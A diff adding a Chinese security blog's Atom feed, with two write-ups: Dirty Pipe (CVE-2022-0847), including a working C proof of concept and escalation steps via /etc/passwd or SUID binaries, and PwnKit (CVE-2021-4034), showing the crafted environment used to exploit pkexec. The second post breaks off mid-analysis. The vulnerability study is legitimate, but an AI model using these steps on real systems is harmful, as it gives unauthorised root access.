@@ -1,0 +1,1302 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://boycc123.github.io/</id>
+    <title>BOY blog</title>
+    <updated>2023-01-01T12:50:48.347Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://boycc123.github.io/"/>
+    <link rel="self" href="https://boycc123.github.io/atom.xml"/>
+    <subtitle>时间从来不语，却回答了很多问题</subtitle>
+    <logo>https://boycc123.github.io/images/avatar.png</logo>
+    <icon>https://boycc123.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, BOY blog</rights>
+    <entry>
+        <title type="html"><![CDATA[dirty-pipe]]></title>
+        <id>https://boycc123.github.io/post/dirty-pipe/</id>
+        <link href="https://boycc123.github.io/post/dirty-pipe/">
+        </link>
+        <updated>2023-01-01T12:43:38.000Z</updated>
+        <content type="html"><![CDATA[<p>[toc]</p>
+<h1 id="一-漏洞信息">一、漏洞信息</h1>
+<h3 id="1-漏洞简述">1. 漏洞简述</h3>
+<ul>
+<li>漏洞名称：（dirty-pipe内核提权漏洞）</li>
+<li>漏洞编号：（CVE-2022-0847）</li>
+<li>漏洞类型：（设计缺陷）</li>
+<li>漏洞影响：（本地提权）</li>
+<li>CVSS评分：（CVSS 3.0评分7.8）</li>
+</ul>
+<h3 id="2-漏洞影响">2. 漏洞影响</h3>
+<p>5.8 &lt;= linux内核 &lt; 5.16.11/5.15.25/5.10.102</p>
+<p>在5.16.11/5.15.25/5.10.102中被修复</p>
+<h3 id="3-解决方案">3. 解决方案</h3>
+<p>https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903</p>
+<h1 id="二-漏洞复现">二、漏洞复现</h1>
+<h3 id="1-环境搭建">1. 环境搭建</h3>
+<p>linux内核版本 : 5.13.0</p>
+<figure data-type="image" tabindex="1"><img src="https://s2.loli.net/2022/03/26/whenFDOWNcd5Vpi.png" alt="image-20220326173440455" loading="lazy"></figure>
+<h3 id="2-复现过程">2. 复现过程</h3>
+<p>下载exp，用gcc编译为可执行文件，直接运行，在文件后面加上suid文件，就可以拿到一个root权限的shell</p>
+<p>1.查找suid文件</p>
+<pre><code class="language-shell">find / -perm -4000 2&gt;/dev/null
+</code></pre>
+<p>2.运行exp</p>
+<pre><code class="language-shell">./exploit-2 /usr/bin/umount
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://s2.loli.net/2022/03/26/QIYBiutSjhewsPK.png" alt="image-20220326173732207" loading="lazy"></figure>
+<h1 id="三-基础知识">三、基础知识</h1>
+<h3 id="1管道">1.管道</h3>
+<p>linux下的管道(pipe)是一种进程间的通信机制，就是在内存中创建一个共享文件，从而使得两个进程可以通过该共享文件来传递信息，管道具有单向传递数据的特点，由于该文件没有文件名，只能在亲属进程之间通信，所以也叫作'匿名管道'</p>
+<p>进程之间通过pipe函数创建管道 <code>int pipe(int fildes[2])</code> ，</p>
+<p>在i节点中有一个 <code>pipe_inode_info</code> 类型的指针 <code>i_pipe</code> ，在普通文件中 <code>i_pipe</code> 指针是 <code>NULL</code> ，在管道文件中该指针指向 <code>pipe_inode_info</code> 结构体，管道的本体也就是该结构体</p>
+<pre><code class="language-c">struct inode {
+    ....
+    struct pipe_inode_info	*i_pipe;
+    ....
+};
+</code></pre>
+<pre><code class="language-c">// pipe_inode_info结构如下:
+struct pipe_inode_info {
+	struct mutex mutex;
+	wait_queue_head_t rd_wait, wr_wait;
+	unsigned int head;
+	unsigned int tail;
+	unsigned int max_usage;
+	unsigned int ring_size;
+#ifdef CONFIG_WATCH_QUEUE
+	bool note_loss;
+#endif
+	unsigned int nr_accounted;
+	unsigned int readers;
+	unsigned int writers;
+	unsigned int files;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	struct page *tmp_page;
+	struct fasync_struct *fasync_readers;
+	struct fasync_struct *fasync_writers;
+	struct pipe_buffer *bufs;	// 构建管道的内存缓冲区
+	struct user_struct *user;
+#ifdef CONFIG_WATCH_QUEUE
+	struct watch_queue *watch_queue;
+#endif
+};
+</code></pre>
+<p>管道的实质也就是一个被当做文件来管理的内存缓冲区，该缓冲区由结构体pipe_buffer管理</p>
+<pre><code class="language-c">// pipe_buffer的结构体如下
+struct pipe_buffer {
+	struct page *page;
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+</code></pre>
+<p>在创建管道时使用的pipe和pipe2这两个系统调用最终都会调用do_pipe2()函数</p>
+<pre><code class="language-c">// fs/pipe.c
+SYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)
+{
+	return do_pipe2(fildes, flags);
+}
+
+SYSCALL_DEFINE1(pipe, int __user *, fildes)
+{
+	return do_pipe2(fildes, 0);
+}
+</code></pre>
+<p>do_pipe2()最终会调用kcalloc()函数分配一个pipe_buffer数组，默认数量是PIPE_DEF_BUFFERS(16)个</p>
+<p>调用链：<code>do_pipe2()</code> -&gt; <code>__do_pipe_flags()</code> --&gt; <code>create_pipe_files()</code> -&gt; <code>get_pipe_inode()</code> -&gt; <code>alloc_pipe_info()</code></p>
+<pre><code class="language-c">pipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT);
+</code></pre>
+<p>来看一下管道的读写操作，注意以下调用链</p>
+<p><code>do_pipe2()</code> -&gt; <code>__do_pipe_flags()</code> -&gt; <code>create_pipe_files()</code> -&gt; <code>alloc_file_pseudo()</code></p>
+<pre><code class="language-c">f = alloc_file_pseudo(inode, pipe_mnt, &quot;&quot;, O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)), &amp;pipefifo_fops);
+</code></pre>
+<p>pipefifo_fops里面定义了我们对管道进行相关操作时调用的函数，当我们从管道读取数据的时候会调用<code>pipe_read()</code> 函数，当我们写入数据到管道中的时候会调用 <code>pipe_write()</code> 函数</p>
+<pre><code class="language-c">const struct file_operations pipefifo_fops = {
+	.open		= fifo_open,
+	.llseek		= no_llseek,
+	.read_iter	= pipe_read,
+	.write_iter	= pipe_write,
+	.poll		= pipe_poll,
+	.unlocked_ioctl	= pipe_ioctl,
+	.release	= pipe_release,
+	.fasync		= pipe_fasync,
+};
+</code></pre>
+<p>先看一下 <code>pipe_write()</code> 函数的实现</p>
+<p>1.如果管道非空，而且上一个buf没有被写满，则进入以下的if语句中，若满足 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位，则尝试向上一个buf中写入数据</p>
+<pre><code class="language-c">	if (chars &amp;&amp; !was_empty) {
+		unsigned int mask = pipe-&gt;ring_size - 1;
+		struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];
+		int offset = buf-&gt;offset + buf-&gt;len;
+
+		if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;
+		    offset + chars &lt;= PAGE_SIZE) {
+			ret = pipe_buf_confirm(pipe, buf);
+			if (ret)
+				goto out;
+
+			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);
+			if (unlikely(ret &lt; chars)) {
+				ret = -EFAULT;
+				goto out;
+			}
+
+			buf-&gt;len += ret;
+			if (!iov_iter_count(from))
+				goto out;
+		}
+	}
+</code></pre>
+<p>2.当上一个buf写满后，往下一个管道写，判断如果管道没满，则正常写入</p>
+<pre><code class="language-c">if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+			unsigned int mask = pipe-&gt;ring_size - 1;
+			struct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			struct page *page = pipe-&gt;tmp_page;
+			int copied;
+
+			if (!page) {
+				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
+				if (unlikely(!page)) {
+					ret = ret ? : -ENOMEM;
+					break;
+				}
+				pipe-&gt;tmp_page = page;
+			}
+
+			/* Allocate a slot in the ring in advance and attach an
+			 * empty buffer.  If we fault or otherwise fail to use
+			 * it, either the reader will consume it or it'll still
+			 * be there for the next write.
+			 */
+			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			head = pipe-&gt;head;
+			if (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {
+				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+				continue;
+			}
+
+			pipe-&gt;head = head + 1;
+			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+
+			/* Insert it into the buffer array */
+			buf = &amp;pipe-&gt;bufs[head &amp; mask];
+			buf-&gt;page = page;
+			buf-&gt;ops = &amp;anon_pipe_buf_ops;
+			buf-&gt;offset = 0;
+			buf-&gt;len = 0;
+			if (is_packetized(filp))
+				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;
+			else
+				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
+			pipe-&gt;tmp_page = NULL;
+
+			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
+			if (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) {
+				if (!ret)
+					ret = -EFAULT;
+				break;
+			}
+			ret += copied;
+			buf-&gt;offset = 0;
+			buf-&gt;len = copied;
+
+			if (!iov_iter_count(from))
+				break;
+		}
+</code></pre>
+<p><code>pipe_read()</code> 函数的实现</p>
+<p>若管道非空，则把buffer对应的page的数据读取出来</p>
+<pre><code class="language-c">		if (!pipe_empty(head, tail)) {
+			struct pipe_buffer *buf = &amp;pipe-&gt;bufs[tail &amp; mask];
+			size_t chars = buf-&gt;len;
+			size_t written;
+			int error;
+
+			if (chars &gt; total_len) {
+				if (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) {
+					if (ret == 0)
+						ret = -ENOBUFS;
+					break;
+				}
+				chars = total_len;
+			}
+
+			error = pipe_buf_confirm(pipe, buf);
+			if (error) {
+				if (!ret)
+					ret = error;
+				break;
+			}
+
+			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);
+			if (unlikely(written &lt; chars)) {
+				if (!ret)
+					ret = -EFAULT;
+				break;
+			}
+			ret += chars;
+			buf-&gt;offset += chars;
+			buf-&gt;len -= chars;
+
+			/* Was it a packet buffer? Clean up and exit */
+			if (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) {
+				total_len = chars;
+				buf-&gt;len = 0;
+			}
+
+			if (!buf-&gt;len) {
+				pipe_buf_release(pipe, buf);
+				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);
+#ifdef CONFIG_WATCH_QUEUE
+				if (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)
+					pipe-&gt;note_loss = true;
+#endif
+				tail++;
+				pipe-&gt;tail = tail;
+				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);
+			}
+			total_len -= chars;
+			if (!total_len)
+				break;	/* common path: read succeeded */
+			if (!pipe_empty(head, tail))	/* More to do? */
+				continue;
+		}
+</code></pre>
+<p>总的来说，我们向一个刚刚建立的管道写数据的时候，会为buf分配一个page，并设置 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位，然后写入page中，只有该标志位被设置才可以对buffer进行写入，当我们读出数据之后，可以看到该标志位并没有被改变，依旧可以写入</p>
+<h3 id="splice函数">splice()函数</h3>
+<p>splice()函数是处理文件与管道之间的数据拷贝的函数，该函数的本质是利用管道在内核空间进行数据的拷贝，大大减小了开销</p>
+<p>splice系统调用的调用链：<code>SYS_splice()</code> -&gt; <code>__do_splice()</code> -&gt; <code>do_splice()</code></p>
+<p>然后do_splice()函数会根据情况调用 <code>splice_pipe_to_pipe()</code> / <code>splice_file_to_pipe()</code> / <code>do_splice_from()</code> 函数</p>
+<p>splice_pipe_to_pipe() 对应着把管道内的数据读到管道中</p>
+<p>splice_file_to_pipe() 对应着把文件内的数据读到管道中</p>
+<p>do_splice_from() 对应着把管道内的数据读取到文件中</p>
+<h1 id="四-漏洞分析">四、漏洞分析</h1>
+<h3 id="1分析">1.分析</h3>
+<p>我们在splice的代码中并未发现有清空pipe_buffer中的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位的地方，当我们把管道读写完之后，所有的标志位都被保留了下来，这就意味着这些page都可以被写，所以我们可以用splice把文件中的数据读取一字节到管道中，当建立完页面映射后，因为上一个buf的标志位任然保留着，所以在下一次读写的时候就会把数据读取到文件映射的页面中，完成越权写文件的操作</p>
+<h3 id="2简单利用">2.简单利用</h3>
+<p>1.先在一个文件中写入很多A，然后以只读的方式打开</p>
+<figure data-type="image" tabindex="3"><img src="https://s2.loli.net/2022/03/26/WXf6cnHaG8SCj1x.png" alt="image-20220326164803579" loading="lazy"></figure>
+<pre><code class="language-C">const char* path = &quot;./tmpfile&quot;;
+int fd = open(path, O_RDONLY);
+</code></pre>
+<p>2.使用pipe()函数创建一个管道</p>
+<pre><code class="language-c">if(pipe(p)){
+    abort();
+}
+</code></pre>
+<p>3.使用splice()函数将文件中的数据定向到管道中</p>
+<pre><code class="language-c">nbytes = splice(fd, 0, p[1], NULL, 5, 0);
+</code></pre>
+<p>4.向管道中写入数据</p>
+<pre><code class="language-c">nbytes_w = write(p[1], &quot;BBBBB&quot;, 5);
+</code></pre>
+<p>5.把管道另一端的数据写到buf中，并打印出来看看是否写入</p>
+<pre><code class="language-c">read(p[0], buf, 10);
+printf(&quot;pipe: %s\n&quot;, buf);
+</code></pre>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char* argv[]){
+    printf(&quot;start poc_2&quot;);
+    const char* path = &quot;./tmpfile&quot;;
+    int fd = open(path, O_RDONLY);
+    loff_t offset = 0;
+    ssize_t nbytes;
+    ssize_t nbytes_w;
+    int p[2];
+    static char buf[4096];
+    memset(buf, 0, 4096);
+    if(pipe(p)){
+        abort();
+    }
+    while(1){
+        nbytes = splice(fd, 0, p[1], NULL, 5, 0);
+        printf(&quot;splice %ld bytes\n&quot;, nbytes);
+        nbytes_w = write(p[1], &quot;BBBBB&quot;, 5);
+        read(p[0], buf, 10);
+        printf(&quot;pipe: %s\n&quot;, buf);
+        if(nbytes == 0 || nbytes_w == 0){
+            break;
+        }
+    }
+    close(fd);
+    return 0;
+}
+</code></pre>
+<p>一开始的文件中并没有B</p>
+<figure data-type="image" tabindex="4"><img src="https://s2.loli.net/2022/03/26/XWyCQ5KUIY1ZT86.png" alt="image-20220326170013477" loading="lazy"></figure>
+<p>我们运行程序后，看到以只读方式打开的文件中被写入了B</p>
+<figure data-type="image" tabindex="5"><img src="https://s2.loli.net/2022/03/26/CmfNvYrScUBbhMy.png" alt="image-20220326170213638" loading="lazy"></figure>
+<h3 id="3提权">3.提权</h3>
+<p>既然可以向没有权限读取的文件中写入数据，那我们就可以向/etc/passwd中写入root的密码，或者向suid程序中写入一段shellcode来达到提权的效果</p>
+<p>1.首先创建一个管道，然后填满管道，让管道上所有的buf都被设置了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p>
+<pre><code class="language-c">if (pipe(p)) abort();
+const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+static char buffer[4096];
+for (unsigned r = pipe_size; r &gt; 0;) {
+    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+    write(p[1], buffer, n);
+    r -= n;
+}
+</code></pre>
+<p>2.然后把管道中的数据清空，但是标志位还在</p>
+<pre><code class="language-c">for (unsigned r = pipe_size; r &gt; 0;) {
+    unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+    read(p[0], buffer, n);
+    r -= n;
+}
+</code></pre>
+<p>3.使用splice()函数将文件中的数据定向到管道中</p>
+<pre><code class="language-c">ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);
+</code></pre>
+<p>4.把shellcode写入管道中，这样就可以通过管道写到文件里面了</p>
+<pre><code class="language-c">nbytes = write(p[1], data, len);
+</code></pre>
+<h3 id="exp">exp</h3>
+<p>https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</p>
+<h1 id="五-参考文献">五、参考文献</h1>
+<p>https://xz.aliyun.com/t/11016#toc-11</p>
+<p>https://mp.weixin.qq.com/s/fGoCM6d6r1WvoOrD-xBuQg</p>
+<p>https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</p>
+<p>https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903</p>
+<p>https://dirtypipe.cm4all.com/</p>
+<p>https://www.136.la/jingpin/show-143974.html</p>
+<p>https://blog.csdn.net/judgejames/article/details/84256340</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[cve-2021-4034浅析]]></title>
+        <id>https://boycc123.github.io/post/cve-2021-4034-qian-xi/</id>
+        <link href="https://boycc123.github.io/post/cve-2021-4034-qian-xi/">
+        </link>
+        <updated>2023-01-01T12:43:16.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1>
+<h3 id="pkexec">pkexec</h3>
+<p>Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令pkexec后跟要执行的命令（具有 root 权限）。</p>
+<p>我们使用pkexec工具时，本地攻击者可以利用内存越界访问将权限提升至root权限</p>
+<p>polkit源码 ：https://www.freedesktop.org/software/polkit/releases/</p>
+<h3 id="main-函数参数解析">main 函数参数解析</h3>
+<p>我们平时编写c语言程序的时候，我们的main()函数中通常会有这样两个参数 <code>int argc, char *argv[]</code></p>
+<p><code>argc</code> 是一个整数，表示的是传递给程序的参数个数</p>
+<p><code>argv[]</code> 是一个数组，表示的是传递给程序的参数内容，从 <code>argv[0]</code> 一直到 <code>argv[argc-1]</code> ，<code>argv[0]</code> 通常是程序本身的程序名，<code>argv[argc]</code> 是一个NULL的指针，用来确保 <code>argv[]</code> 数组到达末尾时终止</p>
+<p>除了 <code>argc</code> 和 <code>argv[]</code> 这两个参数以外，程序还允许有一个 <code>envp[]</code> 参数，该参数可以为程序提供环境变量的访问</p>
+<p>在内存中，<code>argv[]</code> 和 <code>envp[]</code> 这两个数组是相邻的，像下图一样排列</p>
+<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/b0QVzt"><img src="https://s4.ax1x.com/2022/03/05/b0QVzt.png" alt="b0QVzt.png" loading="lazy"></a></figure>
+<p>我们来看一个程序</p>
+<pre><code class="language-c">//test1.c
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[], char** envp)
+{
+        printf(&quot;argc:%d\n&quot;, argc);
+        printf(&quot;argv[0]:%s\nargv[1]:%s\nargv[2]:%s\nargv[3]:%s\nargv[4]:%s\n&quot;, argv[0], argv[1], argv[2], argv[3], argv[4]);
+}
+</code></pre>
+<p>我们运行该程序，可以看到 <code>argv[0]</code> 是当前程序的程序名字， <code>argv[1]</code> 是NULL，用来确保 <code>argv[]</code> 数组到达末尾时终止，我们看 <code>argv[2]</code> 的输出，是一个环境变量<code>SHELL=/bin/bash</code>，这本应该是 <code>envp[0]</code> 里面的内容，但这里却被我们用 <code>argv[2]</code> 越界读取到了，后面的 <code>argv[3]</code> / <code>argv[4]</code> 则相应读取到了 <code>envp[1]</code> / <code>envp[2]</code> 里面的内容</p>
+<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/b0QtyV"><img src="https://s4.ax1x.com/2022/03/05/b0QtyV.png" alt="b0QtyV.png" loading="lazy"></a></figure>
+<h1 id="两个程序">两个程序</h1>
+<h3 id="1c">1.c</h3>
+<p>有了上面main函数参数在内存中排列的基础之后，我们来看两个小程序</p>
+<pre><code class="language-c">// 1.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(int argc, char *argv[]){
+        printf(&quot;argc : %d\n&quot;, argc);
+        printf(&quot;argv[0] : %s\nargv[1] : %s\nargv[2] : %s\n&quot;, argv[0], argv[1], argv[2]);
+}
+</code></pre>
+<p>运行之后，可以看到像上面的那个test1程序一样，这里也通过越界读取，把 <code>envp[0]</code> 中的环境变量读取出来了</p>
+<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/b08dj1"><img src="https://s4.ax1x.com/2022/03/05/b08dj1.png" alt="b08dj1.png" loading="lazy"></a></figure>
+<h3 id="2c">2.c</h3>
+<p>我们再写一个2.c文件</p>
+<pre><code class="language-c">// 2.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char *argv[]){
+        char* argv_test[] = {&quot;./1&quot;, NULL};
+        char* envp_test[] = {&quot;aaaa&quot;, NULL};
+        execve(&quot;./1&quot;, argv_test, envp_test);
+}
+</code></pre>
+<p>我们来看一下 <code>execve()</code> 函数的函数原型，它是包含在 <code>&lt;unistd.h&gt;</code> 头文件中的</p>
+<p><code>int execve(const char *filename, char *const argv[], char *const envp[]);</code></p>
+<p>该函数可以运行一个文件，并传入相应的 <code>argv[]</code> 和 <code>envp[]</code> 值</p>
+<p>这里的 <code>argv_test[] = {&quot;./1&quot;, NULL};</code> 和 <code>envp_test[] = {&quot;aaaa&quot;, NULL};</code>作为了execve()函数的第二个和第三个参数，</p>
+<p>执行 <code>execve(&quot;./1&quot;, argv_test, envp_test);</code> 就相当于运行程序 1 ，然后将 <code>argv[]</code> 赋值为 <code>{&quot;./1&quot;, NULL}</code> ，即 <code>argv[0] = &quot;./1&quot;</code> ，<code>argv[1] = NULL</code> ，然后将 envp[] 赋值为 {&quot;aaaa&quot;, NULL} ，即 <code>envp[0] = &quot;aaaa&quot;</code> ， <code>envp[1] = NULL</code></p>
+<p>运行之后，我们看到 <code>argv[0]</code> / <code>argv[1]</code> 和程序 1 输出的一样 <code>argv[2]</code> 输出了 <code>aaaa</code> ，<code>argv[3]</code> 就输出了原本 <code>encp[0]</code> 的内容 <code>&quot;aaaa&quot;</code></p>
+<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/b0GqIO"><img src="https://s4.ax1x.com/2022/03/05/b0GqIO.png" alt="b0GqIO.png" loading="lazy"></a></figure>
+<h3 id="小修改">小修改</h3>
+<p>现在我们将 2.c 程序小小修改一下，命名为3.c</p>
+<pre><code class="language-c">// 3.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char *argv[]){
+        char* argv_test[] = {NULL};
+        char* envp_test[] = {&quot;aaaa&quot;, NULL};
+        execve(&quot;./1&quot;, argv_test, envp_test);
+}
+</code></pre>
+<p>这时候我们执行 <code>execve(&quot;./1&quot;, argv_test, envp_test);</code> 就相当于在运行程序 1 时，将 <code>argv[]</code> 赋值为 <code>{NULL}</code> ，将 <code>envp[]</code> 赋值为 <code>{&quot;aaaa&quot;, NULL};</code> ，那么在程序 1 执行 <code>printf(&quot;argc : %d\n&quot;, argc);</code> 的时候，因为 <code>argv[]</code> 没有值，所以 <code>argc = 0</code> ，在执行 <code>printf(&quot;argv[0] : %s\nargv[1] : %s\nargv[2] : %s\n&quot;, argv[0], argv[1], argv[2]);</code> 的时候，<code>argv[0]</code> 就是<code>argv[argc]</code> 即 <code>NULL</code> ，<code>argv[1]</code> 就是 <code>envp[0]</code> 即 <code>aaaa</code> ，<code>argv[2]</code> 就是 <code>envp[1]</code> 即 <code>NULL</code> ，最终输出如下</p>
+<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/b0ahRO"><img src="https://s4.ax1x.com/2022/03/05/b0ahRO.png" alt="b0ahRO.png" loading="lazy"></a></figure>
+<h1 id="回到源码">回到源码</h1>
+<p>我们从 https://www.freedesktop.org/software/polkit/releases/ 下载 polkit-0.120.tar.gz 源码，解压后我们查看 <code>polkit-0.120\src\programs\pkexec.c</code> 文件</p>
+<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/b0wGEn"><img src="https://s4.ax1x.com/2022/03/05/b0wGEn.png" alt="b0wGEn.png" loading="lazy"></a></figure>
+<p>可以看到 main 函数一开始就进入一个for循环，如果看了上面那两个小程序之后我们就可以知道，这里如果 <code>argc</code> 的值为 0 ，则不会进入这个 for 循环，这时候 <code>n = 1</code> ， <code>argc = 0</code> ， <code>argv = {NULL}</code> ，我们继续往下看</p>
+<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/b0DluD"><img src="https://s4.ax1x.com/2022/03/05/b0DluD.png" alt="b0DluD.png" loading="lazy"></a></figure>
+<p>这里将 <code>argv[n]</code> 的值赋给了 <code>path</code> ，又因为 <code>n = 1</code> ，<code>argv = {NULL}</code> ，那么 <code>argv[1]</code> 就相当于 <code>envp[0]</code> ，所以这里相当于将 <code>envp[0]</code> 这个环境变量的值赋给了 <code>path</code> ，继续往下看</p>
+<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/b0rFRP"><img src="https://s4.ax1x.com/2022/03/05/b0rFRP.png" alt="b0rFRP.png" loading="lazy"></a></figure>
+<p>这里进入了一个 if 循环，如果 <code>path</code> 的开头不是 <code>/</code> ，即我们的那个环境变量开头不是 <code>/</code> ，那么就回去寻找程序的绝对地址，然后 s 又赋值给 <code>path</code> 和 <code>argv[n]</code> ，<code>argv[n]</code> 就是 <code>argv[1]</code> ，如果我们在最一开始就给 <code>pkexec</code> 这个程序的 <code>argv[]</code> 赋值为 <code>NULL</code> ，然后将 <code>envp[0]</code> 赋值为一个恶意的环境变量，这样就可以将一个恶意的环境变量写到程序运行时的进程空间里面了</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<p>这里我们引入一个环境变量 <code>GCONV_PATH</code> ，该变量可以引入外部的 .so 文件并且执行里面的函数，但是这里我们不能直接在 <code>envp[]</code> 中指定这个环境变量，因为linux 的动态连接器 ld-linux-x86-64.so.2 会在特权程序执行的时候清除敏感环境变量，我们来看一下 glibc-2.23 中的 <code>elf/dl-support.c</code> 中的 <code>_dl_non_dynamic_init</code> 函数，该函数将一些环境变量都清楚了，里面就包含了 <code>GCONV_PATH</code></p>
+<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/b0bPF1"><img src="https://s4.ax1x.com/2022/03/05/b0bPF1.png" alt="b0bPF1.png" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/b0bMFI"><img src="https://s4.ax1x.com/2022/03/05/b0bMFI.png" alt="b0bMFI.png" loading="lazy"></a></figure>
+<p>这些都是为了防止低权限的用户通过环境变量利用 suid 程序提权，这时候我们该如何用漏洞呢，我们在阅读 <code>pkexec.c</code> 源码的时候可以看到程序还多次引用了 <code>g_printerr</code> 函数，在调用该函数的时候，会检查环境变量 <code>CHARSET</code> ，如果该变量的值不为 <code>UTF-8</code> ，<code>g_printerr()</code> 就会调用 glibc 中的 <code>iconv_open()</code> ，来转换格式， <code>iconv_open()</code> 函数会先查找 gconv-modules 文件，该文件里面存放了字符集的路径，这些路径指向的是 .so 文件， <code>iconv_open()</code> 函数在找到 .so 文件后会调用 .so 文件中的 <code>gconv()</code> 与 <code>gonv_init()</code> 函数，所以我们只需要触发 <code>g_printerr</code> 函数，然后调用某个 .so 文件中的 <code>gconv()</code> 与 <code>gonv_init()</code> 函数，如果该 .so 文件是我们伪造的，那么可以执行我们设计的函数了</p>
+<p>所以我们得要先触发 p_printerr 函数</p>
+<p>我们继续看源码，里面有这么一个函数 validate_environment_variable</p>
+<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/bB9FMR"><img src="https://s4.ax1x.com/2022/03/05/bB9FMR.png" alt="bB9FMR.png" loading="lazy"></a></figure>
+<p>只要构造一个 XAUTHORITY变量，然后里面有 “..”即可触发g_printerr函数或者构造一个错误的SHELL变量，就会触发g_printerr函数</p>
+<p>这样我们的思路就差不多有了，利用execve()函数将pkexec的argv[]设置为空，然后将其环境变量列表envp[]设置为 <code>envp[]={&quot;pwnkit.so:.&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;SHELL=BOY&quot;, &quot;CHARSET=PWNKIT&quot;, NULL}</code> ，然后我们跟着源码走一遍</p>
+<p>先是 <code>for (n = 1; n &lt; (guint) argc; n++)</code> 这个for循环，因为我们的argv[]是空，所以不会进入这个循环，那么此时 <code>n=1</code> ，<code>argc=0</code> ，然后是 <code>path = g_strdup (argv[n]);</code> 将 <code>argv[1]</code> 即 <code>envp[0]</code> 的值给了 <code>path</code> ，所以现在 <code>path=pwnkit.so:.</code> ，然后就是下面获取路径的代码</p>
+<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/b0rFRP"><img src="https://s4.ax1x.com/2022/03/05/b0rFRP.png" alt="b0rFRP.png" loading="lazy"></a></figure>
+<p>因为 <code>path=pwnkit.so:.</code> ，第一个字符不是/所以就会执行 <code>s = g_find_program_in_path (path);</code> 去寻找绝对路径，又因为此时的环境变量 <code>PATH=GCONV_PATH=.</code> 所以此时 <code>s</code> 就被赋值为了 <code>PATH=GCONV_PATH=./pwnkit.so:.</code> ，然后就是执行 <code>argv[n] = path = s;</code> 将<code>PATH=GCONV_PATH=./pwnkit.so:.</code>赋值给 <code>argv[1]</code> ，后面的代码就是一个一个将环境变量提取出来，然后调用 <code>validate_environment_variable</code> 函数检查变量</p>
+<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/bDDUv6"><img src="https://s1.ax1x.com/2022/03/06/bDDUv6.png" alt="bDDUv6.png" loading="lazy"></a></figure>
